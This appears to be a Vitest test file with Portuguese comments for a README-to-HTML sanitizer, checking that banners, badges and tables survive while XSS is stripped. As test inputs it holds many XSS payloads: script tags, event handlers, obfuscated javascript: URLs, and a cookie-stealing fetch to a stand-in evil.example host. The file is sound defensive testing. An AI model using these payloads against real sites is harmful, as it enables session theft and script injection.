// @vitest-environment node

import { describe, it, expect } from "vitest";
import { renderReadme } from "./_devhub-markdown.js";
import { _interno, hrefSeguro, srcSeguro } from "./_devhub-sanitize.js";

/* ─────────────────────────────────────────────────────────
   O conversor de README é a única parte do servidor que
   entrega HTML não escapado ao navegador. Estes testes
   existem para que isso continue sendo uma decisão, e não
   um descuido que sobreviveu a uma refatoração.

   A asserção certa quase nunca é "a saída não contém a
   string X": `onerror=` aparece, escapado, dentro de um
   parágrafo, e procurar a substring crua confunde texto com
   marcação. O que se afirma aqui é sobre ABERTURA DE TAG e
   sobre ATRIBUTO EMITIDO — o que o navegador interpreta.
───────────────────────────────────────────────────────── */

const ORIGEM = { owner: "https-shini", repo: "AuthService" };
const render = (md: string) => renderReadme(md, ORIGEM);

/**
 * Os nomes de atributo que o sanitizador REALMENTE emitiu.
 *
 * Procurar a substring `onerror=` na saída não serve: ela aparece,
 * escapada, dentro de um `alt` ou de um `<code>`, onde é texto visível e
 * não atributo. O sanitizador emite tags numa forma canônica — nome,
 * depois pares `nome="valor escapado"`, sem aspa crua dentro do valor —,
 * e é essa forma que dá para ler com segurança.
 */
function atributosEmitidos(html: string): string[] {
    const nomes: string[] = [];
    for (const tag of html.matchAll(
        /<[a-zA-Z][a-zA-Z0-9]*((?:\s+[a-zA-Z:-]+="[^"]*")*)\s*\/?>/g,
    )) {
        /* Nome e valor casados JUNTOS: casar só o nome varreria também o
           interior dos valores, e um `alt="… onerror=…"` — que é texto
           escapado, inofensivo — passaria por atributo. */
        for (const attr of (tag[1] ?? "").matchAll(
            /\s+([a-zA-Z:-]+)="[^"]*"/g,
        )) {
            nomes.push(attr[1]!.toLowerCase());
        }
    }
    return nomes;
}

/** Nenhum atributo emitido pode ser executável. */
function semExecutavel(html: string): void {
    const perigosos = atributosEmitidos(html).filter(
        (n) =>
            n.startsWith("on") ||
            ["srcdoc", "formaction", "xlink:href", "style"].includes(n),
    );
    expect(perigosos).toEqual([]);
}

/* ═════════════════════════════════════════════════════════
   O que deve SOBREVIVER — a razão de este módulo existir
   ═════════════════════════════════════════════════════════ */

describe("preserva o HTML que README de verdade usa", () => {
    it("mantém <img> com dimensão e alinhamento", () => {
        const html = render(
            '<img width="100%" src="https://exemplo.dev/banner.png" alt="Banner" align="center"/>',
        );
        expect(html).toContain("<img");
        expect(html).toContain('src="https://exemplo.dev/banner.png"');
        expect(html).toContain('width="100%"');
        expect(html).toContain('alt="Banner"');
        expect(html).toContain('align="center"');
    });

    it('mantém <div align="center">, que é o banner de todo README', () => {
        const html = render('<div align="center">\n\nOlá\n\n</div>');
        expect(html).toContain('<div align="center">');
        expect(html).toContain("</div>");
    });

    it("mantém badge — imagem dentro de link", () => {
        const html = render(
            "[![Licença](https://img.shields.io/badge/MIT-green.svg)](https://opensource.org/licenses/MIT)",
        );
        expect(html).toContain('<a href="https://opensource.org/licenses/MIT"');
        expect(html).toContain(
            '<img src="https://img.shields.io/badge/MIT-green.svg"',
        );
    });

    it('mantém <h1 align="center"> com emoji', () => {
        const html = render('<h1 align="center">🔐 AuthService</h1>');
        expect(html).toContain('<h1 align="center">');
        expect(html).toContain("🔐 AuthService");
    });

    it('mantém <p align="center"> com <br/> e <strong>', () => {
        const html = render(
            '<p align="center"> Sistema <strong>fullstack</strong> —<br/> com JWT. </p>',
        );
        expect(html).toContain('<p align="center">');
        expect(html).toContain("<strong>");
        expect(html).toContain("<br>");
    });

    it("mantém <details>/<summary>", () => {
        const html = render(
            "<details><summary>Mais</summary>\n\ntexto\n\n</details>",
        );
        expect(html).toContain("<details>");
        expect(html).toContain("<summary>");
    });

    it("mantém a classe de destaque de sintaxe", () => {
        const html = render("```python\nprint(1)\n```");
        expect(html).toContain('<code class="language-python">');
        expect(html).toContain("print(1)");
    });

    it("mantém tabela com alinhamento", () => {
        const html = render("| a | b |\n|:--|--:|\n| 1 | 2 |");
        expect(html).toContain("<table>");
        expect(html).toContain('<th align="left">');
        expect(html).toContain('<th align="right">');
        expect(html).toContain("<td");
    });

    it("reescreve caminho relativo de imagem para o arquivo cru", () => {
        /* Sem isto, a captura de tela do README aponta para uma página do
           portfólio que não existe, e a imagem some. */
        const html = render("![Banner](./read-model/img/Banner.png)");
        expect(html).toContain(
            'src="https://raw.githubusercontent.com/https-shini/AuthService/HEAD/read-model/img/Banner.png"',
        );
    });

    it("reescreve link relativo para o arquivo no repositório", () => {
        const html = render("[licença](./LICENSE)");
        expect(html).toContain(
            'href="https://github.com/https-shini/AuthService/blob/HEAD/LICENSE"',
        );
    });
});

/* ═════════════════════════════════════════════════════════
   O que NÃO pode sobreviver
   ═════════════════════════════════════════════════════════ */

describe("bloqueia execução", () => {
    it("remove <script> junto com o conteúdo", () => {
        const html = render("<script>alert(document.cookie)</script>\n\nok");
        expect(html).not.toMatch(/<script/i);
        /* O corpo também sai — ele É o ataque. */
        expect(html).not.toContain("document.cookie");
        expect(html).toContain("ok");
    });

    it("remove <script> sem fechamento, com tudo o que vem depois", () => {
        const html = render("<script>alert(1)\n\nresto");
        expect(html).not.toMatch(/<script/i);
        expect(html).not.toContain("alert(1)");
    });

    it.each([
        ["iframe", '<iframe src="https://evil.example"></iframe>'],
        ["object", '<object data="x.swf"></object>'],
        ["embed", '<embed src="x.swf">'],
        ["style", "<style>body{background:url(javascript:alert(1))}</style>"],
        ["svg", "<svg><script>alert(1)</script></svg>"],
        ["math", "<math><mtext></mtext></math>"],
        [
            "form",
            '<form action="https://evil.example"><input name="senha"></form>',
        ],
        [
            "meta",
            '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        ],
        ["base", '<base href="https://evil.example/">'],
        ["link", '<link rel="stylesheet" href="https://evil.example/x.css">'],
    ])("remove <%s>", (_, entrada) => {
        const html = render(entrada);
        expect(html).not.toMatch(
            /<(iframe|object|embed|style|svg|math|form|input|meta|base|link)\b/i,
        );
    });

    it.each([
        '<img src="x" onerror="alert(1)">',
        '<div onclick="alert(1)">clique</div>',
        '<a href="https://ok.dev" onmouseover="alert(1)">x</a>',
        '<p ONLOAD="alert(1)">x</p>',
        '<img src="x" OnErRoR="alert(1)">',
        "<div onfocus=alert(1) tabindex=1>x</div>",
    ])("nunca emite handler de evento: %s", (entrada) => {
        semExecutavel(render(entrada));
    });

    it.each([
        ["javascript:", "[x](javascript:alert(1))"],
        ["JaVaScRiPt:", "[x](JaVaScRiPt:alert(1))"],
        ["vbscript:", "[x](vbscript:msgbox(1))"],
        ["data: html", "[x](data:text/html;base64,PHNjcmlwdD4=)"],
        ["file:", "[x](file:///etc/passwd)"],
        ["entidade", '<a href="java&#115;cript:alert(1)">x</a>'],
        ["entidade hex", '<a href="java&#x73;cript:alert(1)">x</a>'],
        ["tabulação no meio", '<a href="java\tscript:alert(1)">x</a>'],
        ["nova linha no meio", '<a href="java\nscript:alert(1)">x</a>'],
        ["espaço antes", '<a href="  javascript:alert(1)">x</a>'],
        ["nulo no meio", '<a href="java\u0000script:alert(1)">x</a>'],
    ])("rejeita protocolo perigoso (%s)", (_, entrada) => {
        const html = render(entrada);
        expect(html.toLowerCase()).not.toContain("javascript:");
        expect(html.toLowerCase()).not.toContain("vbscript:");
        expect(html.toLowerCase()).not.toContain("data:text/html");
        expect(html.toLowerCase()).not.toContain("file:");
    });

    it("rejeita data: em imagem, inclusive svg", () => {
        /* `data:image/svg+xml` carrega SVG, e SVG carrega script. */
        const html = render(
            '<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pg==">',
        );
        expect(html).not.toContain("data:");
    });

    it("não deixa atributo escapar das aspas", () => {
        /* O valor contém uma aspa codificada. Se ela fosse reemitida crua,
           encerraria o `alt` e o que viesse depois viraria atributo. O
           sanitizador decodifica para julgar e reescapa ao emitir, então
           `onerror` continua sendo texto dentro do `alt`. */
        const html = render(
            '<img src="https://ok.dev/a.png" alt="a&quot; onerror=&quot;alert(1)">',
        );
        semExecutavel(html);
        expect(html).toContain("&quot;");
        expect(html).not.toContain('" onerror="');
    });

    it("descarta atributo fora da allowlist", () => {
        const html = render(
            '<div id="x" style="position:fixed" class="y" data-x="1" srcdoc="z">t</div>',
        );
        expect(html).not.toContain("id=");
        expect(html).not.toContain("style=");
        expect(html).not.toContain("data-x=");
        expect(html).not.toContain("srcdoc=");
    });

    it("mantém o texto de tag fora da allowlist, sem a marcação", () => {
        const html = render("<marquee>importante</marquee>");
        expect(html).not.toContain("<marquee");
        expect(html).toContain("importante");
    });

    it("descarta comentário, inclusive condicional", () => {
        const html = render(
            "<!--[if IE]><script>alert(1)</script><![endif]-->texto",
        );
        expect(html).not.toMatch(/<script/i);
        expect(html).not.toContain("alert(1)");
        expect(html).toContain("texto");
    });

    it("não se confunde com `<` solto no texto", () => {
        const html = render("Se a < b e b > c, então...");
        expect(html).toContain("&lt;");
        expect(html).not.toMatch(/<b>/);
    });

    it("fecha o que o README deixou aberto", () => {
        /* Sem isto, o resto da página entraria para dentro da <div>. */
        const html = render('<div align="center"><strong>sem fechar');
        expect(html).toContain("</strong>");
        expect(html).toContain("</div>");
    });

    it("descarta fechamento sem abertura", () => {
        /* Emiti-lo fecharia um elemento da página, não do README. */
        const html = render("texto</div></main>");
        expect(html).not.toContain("</div>");
        expect(html).not.toContain("</main>");
    });

    it("escapa HTML dentro de bloco de código", () => {
        const html = render("```html\n<script>alert(1)</script>\n```");
        expect(html).not.toMatch(/<script/i);
        expect(html).toContain("&lt;script&gt;");
    });

    it("escapa HTML em código inline", () => {
        const html = render("Use `<img onerror=x>` com cuidado");
        semExecutavel(html);
        expect(html).toContain("&lt;img");
        expect(html).not.toContain("<img");
    });
});

/* ═════════════════════════════════════════════════════════
   As funções de URL, isoladas
   ═════════════════════════════════════════════════════════ */

describe("URLs", () => {
    it.each([
        "javascript:alert(1)",
        "JAVASCRIPT:alert(1)",
        "vbscript:x",
        "data:text/html,<script>",
        "file:///etc/passwd",
        "jAvAsCrIpT:void(0)",
    ])("hrefSeguro recusa %s", (url) => {
        expect(hrefSeguro(url, ORIGEM)).toBeNull();
    });

    it.each(["https://ok.dev/x", "http://ok.dev", "mailto:a@b.dev", "#secao"])(
        "hrefSeguro aceita %s",
        (url) => {
            expect(hrefSeguro(url, ORIGEM)).toBe(url);
        },
    );

    it("srcSeguro só aceita http(s)", () => {
        expect(srcSeguro("https://ok.dev/a.png", ORIGEM)).toBe(
            "https://ok.dev/a.png",
        );
        expect(srcSeguro("data:image/png;base64,AAA", ORIGEM)).toBeNull();
        expect(srcSeguro("javascript:alert(1)", ORIGEM)).toBeNull();
    });

    it("`//host` não vira destino externo", () => {
        /* `//evil.example/x` herda o esquema da página e apontaria para
           fora. Vira caminho dentro do repositório: o host da URL final é
           github.com, e é isso que importa — o texto `evil.example`
           sobrevive como segmento de caminho, inofensivo. */
        const url = hrefSeguro("//evil.example/x", ORIGEM)!;
        expect(new URL(url).host).toBe("github.com");
    });
});

/* ═════════════════════════════════════════════════════════
   Coerência da allowlist
   ═════════════════════════════════════════════════════════ */

describe("allowlist", () => {
    it("nenhum atributo `on*` está listado", () => {
        for (const atributos of Object.values(_interno.PERMITIDOS)) {
            for (const a of atributos) {
                expect(a.startsWith("on")).toBe(false);
            }
        }
    });

    it("todo atributo listado tem regra de validação que o aceita", () => {
        /* Um atributo na allowlist sem regra correspondente seria sempre
           descartado — a lista mentiria sobre o que o módulo faz. */
        const COM_REGRA = new Set([
            "href",
            "src",
            "align",
            "width",
            "height",
            "colspan",
            "rowspan",
            "start",
            "class",
            "alt",
            "title",
        ]);
        for (const [tag, atributos] of Object.entries(_interno.PERMITIDOS)) {
            for (const a of atributos) {
                expect(COM_REGRA.has(a), `${tag}.${a} sem regra`).toBe(true);
            }
        }
    });

    it("nada de DESCARTA_CONTEUDO está também permitido", () => {
        for (const tag of _interno.DESCARTA_CONTEUDO) {
            expect(tag in _interno.PERMITIDOS).toBe(false);
        }
    });
});

/* ═════════════════════════════════════════════════════════
   O README real do AuthService — o caso que motivou tudo
   ═════════════════════════════════════════════════════════ */

const README_AUTHSERVICE = `<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=120&section=header"/>

<h1 align="center">🔐 AuthService</h1>

<p align="center">
Sistema de autenticação fullstack com tema <strong>Dark Industrial Terminal</strong> —<br/>
API REST em FastAPI com JWT e frontend integrado.
</p>

<div align="center">

[![API Docs](https://img.shields.io/badge/docs-online-blue)](https://authservice-mbul.onrender.com/docs)
[![Licença](https://img.shields.io/badge/licen%C3%A7a-MIT-green)](./LICENSE)

</div>

<div align="center">
  <img src="./read-model/img/Banner.png" alt="Banner AuthService" width="100%"/>
</div>

## 📌 O que é este projeto?

O **AuthService** combina uma API REST com um frontend integrado.

| Recurso | Estado |
|:--------|:------:|
| JWT     | ✅     |

\`\`\`bash
docker compose up
\`\`\`
`;

describe("README real do AuthService", () => {
    const html = render(README_AUTHSERVICE);

    it("o banner, o título e a descrição aparecem como HTML, não como texto", () => {
        expect(html).toContain("<img");
        expect(html).toContain('<h1 align="center">');
        expect(html).toContain('<p align="center">');
        expect(html).toContain("<strong>Dark Industrial Terminal</strong>");
        expect(html).toContain("<br>");
    });

    it("os badges continuam clicáveis", () => {
        expect(html).toContain(
            '<a href="https://authservice-mbul.onrender.com/docs"',
        );
        expect(html).toContain("img.shields.io");
    });

    it("a captura de tela relativa aponta para o arquivo cru", () => {
        expect(html).toContain(
            "raw.githubusercontent.com/https-shini/AuthService/HEAD/read-model/img/Banner.png",
        );
    });

    it("o link relativo da licença aponta para o repositório", () => {
        expect(html).toContain(
            "github.com/https-shini/AuthService/blob/HEAD/LICENSE",
        );
    });

    it("tabela e bloco de código são convertidos", () => {
        expect(html).toContain("<table>");
        expect(html).toContain('<code class="language-bash">');
        expect(html).toContain("docker compose up");
    });

    it("e nada disso trouxe superfície de execução junto", () => {
        semExecutavel(html);
        expect(html).not.toMatch(/<(script|iframe|object|embed|style)\b/i);
        expect(html.toLowerCase()).not.toContain("javascript:");
    });

    it("o mesmo README com um payload enxertado continua inerte", () => {
        const envenenado = render(
            README_AUTHSERVICE.replace(
                "## 📌 O que é este projeto?",
                `<script>fetch('https://evil.example?c='+document.cookie)</script>
<img src=x onerror="alert(1)">
<a href="javascript:alert(2)">clique</a>
<iframe src="https://evil.example"></iframe>

## 📌 O que é este projeto?`,
            ),
        );

        expect(envenenado).not.toMatch(/<(script|iframe)\b/i);
        semExecutavel(envenenado);
        expect(envenenado.toLowerCase()).not.toContain("javascript:");
        expect(envenenado).not.toContain("evil.example");
        /* E o README legítimo continuou inteiro ao lado do payload. */
        expect(envenenado).toContain('<h1 align="center">');
    });
});
